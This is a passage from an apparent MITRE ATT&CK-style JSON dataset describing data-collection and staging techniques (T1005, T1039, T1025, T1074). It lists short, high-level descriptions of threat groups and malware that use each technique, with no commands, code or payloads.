victim\u2019s Slack and Microsoft Teams for conversations about the intrusion and incident response."}]}]}, {"name": "Data from Local System", "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.", "detailed_description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.", "id": "T1005", "examples": [{"id": "S1028", "name": "Action RAT", "description": "Action RAT can collect local data from an infected machine."}, {"id": "G1030", "name": "Agrius", "description": "Agrius gathered data from database and other critical servers in victim environments, then used wiping mechanisms as an anti-analysis and anti-forensics mechanism."}, {"id": "S1025", "name": "Amadey", "description": "Amadey can collect information from a compromised host."}, {"id": "G0138", "name": "Andariel", "description": "Andariel has collected large numbers of files from compromised network systems for later extraction."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can collect data on a compromised host."}, {"id": "G0006", "name": "APT1", "description": "APT1 has collected files from a local victim."}, {"id": "G0007", "name": "APT28", "description": "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration."}, {"id": "G0016", "name": "APT29", "description": "APT29 has stolen data from compromised hosts."}, {"id": "G0022", "name": "APT3", "description": "APT3 will identify Microsoft Office documents on the victim's computer."}, {"id": "G0067", "name": "APT37", "description": "APT37 has collected data from victims' local systems."}, {"id": "G0082", "name": "APT38", "description": "APT38 has collected data from a compromised host."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used various tools to steal files from the compromised host."}, {"id": "G0096", "name": "APT41", "description": "APT41 has uploaded files and data from a compromised host."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda captured local Windows security event log data from victim machines using the wevtutil utility to extract contents to an evtx output file."}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can collect data such as PowerPoint files, Word documents, Excel files, PDF files, text files, database files, and image files from an infected machine."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has collected data from a compromised network."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has uploaded files from victims' machines."}, {"id": "S0128", "name": "BADNEWS", "description": "When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx."}, {"id": "S0234", "name": "Bandook", "description": "Bandook can collect local files from the system ."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot collects files from the local system."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can retrieve information from the infected machine."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has collected information from a compromised host."}, {"id": "S0564", "name": "BlackMould", "description": "BlackMould can copy files on a compromised host."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has uploaded files from victim machines."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon can upload files from a compromised host."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has exfiltrated files stolen from local systems."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has the ability to upload files from a compromised system."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can capture and compress stolen credentials from the Registry and volume shadow copies."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors obtained files and data from the compromised network."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks."}, {"id": "C0026", "name": "C0026", "description": "During C0026, the threat actors collected documents from compromised hosts."}, {"id": "S0274", "name": "Calisto", "description": "Calisto can collect data from user directories."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell has a module to collect information from the local database."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can collect files from a compromised host."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can collect data and files from a compromised host."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can collect files from compromised hosts."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component can upload local files."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can collect data from a local system."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can collect information from a compromised host."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can collect data from a local system."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has retrieved iPhone text messages from iTunes phone backup files."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke steals user files from local hard drives with file extensions that match a predefined list."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors collected data and files from compromised networks."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can upload files to C2 from victim machines."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can collect information from a compromised host."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can exfiltrate files from compromised systems."}, {"id": "S0498", "name": "Cryptoistic", "description": "Cryptoistic can retrieve files from the local file system."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has exfiltrated data from a compromised machine."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors stole the running configuration and cache data from targeted Ivanti Connect Secure VPNs."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can upload files from a compromised host."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can upload files from compromised hosts."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can collect files from a compromised host."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can upload files from infected machines after receiving a command with uploaddd in the string."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has collected data from local victim systems."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can collect information from a compromised host."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can transfer files from the victim machine."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can collect a variety of information from victim machines."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can gather data from infected systems."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear gathers victim system information such as enumerating the volume of a given device or extracting system and security event logs for analysis."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can collect sensitive NTLM material from a compromised host."}, {"id": "S0404", "name": "esentutl", "description": "esentutl can be used to collect data from local file systems."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can copy files and directories from a compromised host."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has collected and exfiltrated payment card data from compromised systems."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has collected files and other sensitive information from a compromised network."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can collect data from a compromised host, including Windows authentication information."}, {"id": "S0036", "name": "FLASHFLOOD", "description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system. FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. FLASHFLOOD also collects information stored in the Windows Address Book."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has collected information and files from a compromised machine."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can retrieve configuration data from a compromised AD FS server."}, {"id": "S0193", "name": "Forfiles", "description": "Forfiles can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before)."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has searched local system resources to access sensitive documents."}, {"id": "S0503", "name": "FrameworkPOS", "description": "FrameworkPOS can collect elements related to credit card data from process memory."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used Empire to gather various local system information."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can upload files from victims' machines."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has collected files from infected systems and uploaded them to a C2 server."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can collect data from a compromised host."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to exfiltrate documents from infected systems."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can collect data from a compromised host."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can collect data and files from a compromised host."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has collected data and files from a compromised machine."}, {"id": "S0009", "name": "Hikit", "description": "Hikit can upload files from compromised machines."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can read data from files."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can collect files, passwords, and other data from a compromised host."}, {"id": "G0100", "name": "Inception", "description": "Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can collect data from the system, and can monitor changes in specified directories."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can identify specific files and folders for follow-on exfiltration."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe can collect data from a local system."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar uploads files from a specified directory to the C2 server."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang gathered information and files from local directories for exfiltration."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can upload logs and other data from a compromised host."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can send a file containing victim system information to C2."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has collected Office, PDF, and HWP documents from its victims."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can download files off the target system to send back to the server."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has stored collected information and discovered processes in a tmp file."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK can gather information from compromised hosts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can collect data from a compromised host using a stealer module."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has collected data and files from compromised networks."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron can collect files from a local system."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can obtain data from local systems."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe can collect files of interest from targeted systems."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has collected files and data from compromised machines."}, {"id": "S0409", "name": "Machete", "description": "Machete searches the File system for files of interest."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can collect then exfiltrate files from the compromised system."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can collect files and information from a compromised host."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can upload data from the victim's machine to the C2 server."}, {"id": "S0500", "name": "MCMD", "description": "MCMD has the ability to upload files from an infected device."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has collected various files from the compromised computers."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can collect files and system information from a compromised host."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for collecting files from local systems based on a given set of properties and filenames."}, {"id": "S1015", "name": "Milan", "description": "Milan can upload files from a compromised host."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has collected files and data from a compromised host."}, {"id": "S0083", "name": "Misdat", "description": "Misdat has collected files and data from a compromised host."}, {"id": "S0079", "name": "MobileOrder", "description": "MobileOrder exfiltrates data collected from the victim mobile device."}, {"id": "S1026", "name": "Mongall", "description": "Mongall has the ability to upload files from victim's machines."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae has the capability to upload collected files to C2."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can upload files from a victim's machine."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, the threat actors collected files and other data from compromised systems."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use a file monitor to steal specific files from targeted systems."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can collect data from a local system."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY records data entered from the local system logon at Winlogon to capture credentials in cleartext."}, {"id": "S0340", "name": "Octopus", "description": "Octopus can exfiltrate files from the system using a documents collector tool."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors collected data, files, and other information from compromised networks."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors collected data from compromised hosts."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors exfiltrated files and directories of interest from the targeted system."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has the ability to upload files from a compromised host."}, {"id": "S0594", "name": "Out1", "description": "Out1 can copy files and Registry data from compromised hosts."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can collect information from a compromised host."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell has the ability to copy files on a compromised host."}, {"id": "S0208", "name": "Pasam", "description": "Pasam creates a backdoor through which remote attackers can retrieve files."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork collected and exfiltrated files from the infected system."}, {"id": "S1102", "name": "Pcexter", "description": "Pcexter can upload files from targeted systems."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can collect files and information from a compromised host."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has collected credit card data using native API functions."}, {"id": "S0048", "name": "PinchDuke", "description": "PinchDuke collects user files from the compromised host based on predefined file extensions."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can collect data from a compromised host."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a backdoor through which remote attackers can steal system information."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess has the ability to exfiltrate data, including Chrome and Edge browser database files, from compromised machines."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Exfiltration modules that can access data from local files, volumes, and processes."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can upload files from compromised hosts."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc searches the local system and gathers data."}, {"id": "S0197", "name": "PUNCHTRACK", "description": "PUNCHTRACK scrapes memory for properly formatted payment card data."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can retrieve files from compromised client machines."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve can collect files from a compromised host."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer collects data from victim machines based on configuration information received from command and control nodes."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use a file exfiltration tool to collect recently changed files on a compromised host."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can collect Microsoft Word documents from the target's file system, as well as .txt, .doc, and .xls files from the Internet Explorer cache."}, {"id": "S1113", "name": "RAPIDPULSE", "description": "RAPIDPULSE retrieves files from the victim system via encrypted commands sent to the web shell."}, {"id": "S0169", "name": "RawPOS", "description": "RawPOS dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can collect data from a compromised host."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has collected data from the local disk of compromised hosts."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun has collected data and files from a compromised host."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can collect host data and specific file types."}, {"id": "S0090", "name": "Rover", "description": "Rover searches for files on local drives based on a predefined list of file extensions."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can collect files and information from a compromised host."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can leverage an exfiltration module to download arbitrary files from compromised machines."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to collect data from a compromised machine to deliver to the attacker."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to access the file system on a compromised host."}, {"id": "S1019", "name": "Shark", "description": "Shark can upload files to its C2."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco has dropped a recent-files stealer plugin to C:\\Users\\Public\\WinSrcNT\\It11.exe."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has the capability to upload collected files to a C2."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has the ability to upload files from a compromised host."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE can read files specified on the local system."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has uploaded files and information from victim machines."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 extracted files from compromised networks."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has collected data and files from a compromised host."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette has collected data and other information from a compromised host."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE can collect data from an infected local host."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers data from the local victim system."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can collect data from a compromised host."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected information from a compromised host."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can collect data from an infected host."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can collect information and files from a compromised host."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can upload data and files from a victim's machine."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to steal documents from the local system including the print spooler queue."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can collect data and files from a compromised host."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla can upload files from a compromised host."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has run scripts to collect documents from targeted hosts."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot collects local files and information from the victim\u2019s local machine."}, {"id": "G0010", "name": "Turla", "description": "Turla RPC backdoors can upload files from victim machines."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use its Get command to exfiltrate specified files from the compromised system."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has collected files from victim machines, including certificates and cookies."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can collect information from an air-gapped host machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has stolen files from a sensitive file server and the Active Directory database from targeted environments, and used Wevtutil to extract event log information."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can collect data from a compromised host."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can exfiltrate files from the victim machine."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can send files from the victim machine to C2."}, {"id": "S0645", "name": "Wevtutil", "description": "Wevtutil can be used to export events from a specific log."}, {"id": "G0124", "name": "Windigo", "description": "Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has collected data from a compromised host prior to exfiltration."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can collect information from a compromised host."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has uploaded files from victims' machines."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders."}, {"id": "S0248", "name": "yty", "description": "yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server."}, {"id": "S0672", "name": "Zox", "description": "Zox has the ability to upload files from a targeted system."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can transfer files from a compromised host."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ can collect data from a compromised host."}], "sub_techniques": []}, {"name": "Data from Network Shared Drive", "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.", "detailed_description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.", "id": "T1039", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has collected files from network shared drives."}, {"id": "S0128", "name": "BADNEWS", "description": "When it first starts, BADNEWS crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has exfiltrated files stolen from file shares."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors collected files from network shared drives prior to network encryption."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has collected data of interest from network shares."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke steals user files from network shared drives with file extensions and keywords that match a predefined list."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can collect any files found in the enumerated drivers before sending it to its C2 channel."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has searched network shares to access sensitive documents."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group malware has collected Microsoft Office documents from mapped network drives."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can collect data from network drives and stage it for exfiltration."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has collected data about network drives."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug extracted Word documents from a file server on a victim network."}], "sub_techniques": []}, {"name": "Data from Removable Media", "description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.", "detailed_description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.\nSome adversaries may also use Automated Collection on removable media.", "id": "T1025", "examples": [{"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can find and collect data from removable media devices."}, {"id": "G0007", "name": "APT28", "description": "An APT28 backdoor may collect the entire contents of an inserted USB device."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to collect data from USB devices."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS copies files with certain extensions from USB devices toa predefined directory."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke steals user files from removable media with file extensions and keywords that match a predefined list."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a module to collect data from removable drives."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can monitor removable drives and exfiltrate files matching a given extension list."}, {"id": "S0569", "name": "Explosive", "description": "Explosive can scan all .exe files located in the USB drive."}, {"id": "S0036", "name": "FLASHFLOOD", "description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by SPACESHIP."}, {"id": "S1044", "name": "FunnyDream", "description": "The FunnyDream FilePakMonitor component has the ability to collect files from removable devices."}, {"id": "G0047", "name": "Gamaredon Group", "description": "A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT steals files based on an extension list if a USB drive is connected to the system."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can collect jpeg files from connected MTP devices."}, {"id": "S0409", "name": "Machete", "description": "Machete can find, encrypt, and upload files from fixed and removable drives."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules capable of gathering information from USB thumb drives and CD-ROMs on the victim machine given a list of provided criteria."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT has the ability to extract data from removable devices connected to the endpoint."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can collect data from removable media and stage it for exfiltration."}, {"id": "S0125", "name": "Remsec", "description": "Remsec has a package that collects documents from any inserted USB sticks."}, {"id": "S0090", "name": "Rover", "description": "Rover searches for files on attached removable drives based on a predefined list of file extensions every five seconds."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again."}, {"id": "G0010", "name": "Turla", "description": "Turla RPC backdoors can collect files from USB thumb drives."}, {"id": "S0136", "name": "USBStealer", "description": "Once a removable media device is inserted back into the first victim, USBStealer collects data from it that was exfiltrated from a second victim."}], "sub_techniques": []}, {"name": "Data Staged", "description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.", "detailed_description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.", "id": "T1074", "examples": [{"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has staged data on compromised hosts prior to exfiltration."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can create directories to store logs and other collected data."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can write captured SSH connection credentials to a file under the /var/run directory with a .pid extension for exfiltration."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY has the ability to stage data prior to exfiltration."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider stages data in a centralized database prior to exfiltration."}, {"id": "S1019", "name": "Shark", "description": "Shark has stored information in folders named U1 and U2 prior to exfiltration."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has staged collected data in password-protected archives."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules."}], "sub_techniques": [{"name": "Local Data Staging", "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.", "detailed_description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.", "id": "T1074.001", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL stores output from command execution in a .dat file in the %TEMP% directory."}, {"id": "G1030", "name": "Agrius", "description": "Agrius has used the folder, C:\\windows\\temp\\s\\, to stage data for exfiltration."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can stage files in a central location prior to exfiltration."}, {"id": "G0007", "name": "APT28", "description": "APT28 has stored captured credential information in a file named pi.log."}, {"id": "G0022", "name": "APT3", "description": "APT3 has been known to stage files for exfiltration in a single location."}, {"id": "G0087", "name": "APT39", "description": "APT39 has utilized tools to aggregate data prior to exfiltration."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved exporting data from Oracle databases to local CSV files prior to exfiltration."}, {"id": "G1023", "name": "APT5", "description": "APT5 has staged data on compromised systems prior to exfiltration often in C:\\Users\\Public."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth collects data in a plaintext file named r1.log before exfiltration. "}, {"id": "S0438", "name": "Attor", "description": "Attor has staged collected data in a central upload directory prior to exfiltration."}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can store collected data from an infected host to a file named Hostname_UserName.txt prior to exfiltration."}, {"id": "G0135", "name": "BackdoorDiplomacy", 